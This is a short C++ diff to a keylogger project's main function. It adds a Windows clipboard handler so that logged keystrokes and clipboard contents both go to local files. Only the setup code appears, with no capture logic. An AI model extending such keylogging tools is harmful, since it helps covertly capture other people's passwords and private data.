@@ -1,3 +1,4 @@
+#include "ClipboardHandlerWindows.h"
 #include "FileLogger.h"
 #include "KeycodeMapperUS.h"
 #include "KeystrokeCapturerWindows.h"
@@ -7,12 +8,13 @@
 
 int main() {
     Keylogger::KeycodeMapperUS mapper;
+    Keylogger::ClipboardHandlerWindows clipboard;
 
     Keylogger::FileLogger loggerBin;
-    loggerBin.open(nullptr, "test.bin");
+    loggerBin.open(nullptr, &clipboard, "test.bin");
 
     Keylogger::FileLogger logger;
-    logger.open(&mapper, "test.txt");
+    logger.open(&mapper, &clipboard, "test.txt");
 
     Keylogger::KeystrokeCapturerWindows capturer;
 
